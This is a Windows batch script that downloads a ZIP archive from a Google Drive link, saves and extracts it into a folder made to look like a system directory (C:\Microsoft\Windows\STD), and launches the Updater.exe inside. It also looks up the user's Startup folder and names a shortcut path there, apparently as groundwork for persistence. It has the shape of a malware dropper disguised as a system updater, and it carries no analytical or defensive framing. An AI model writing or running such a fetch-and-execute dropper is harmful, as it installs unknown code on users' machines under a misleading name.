@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1ulcAHJrPW95EPZxCiCwTLLIDkXZOu6qh&export=download&authuser=0&confirm=t&uuid=787d72e5-b1e2-4926-91a8-5cde44ec29e2&at=APvzH3qpi1iAmLSmd4uC9IQPTA5A:1733940775126"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\UpdaterFiles"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"

REM Define the Startup folder for the current user
for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"

REM Full path to the shortcut file
set "shortcutPath=%startupFolder%\UpdaterShortcut.lnk"
cd C:\Microsoft\Windows\STD\UpdaterFiles\
start Updater.exe
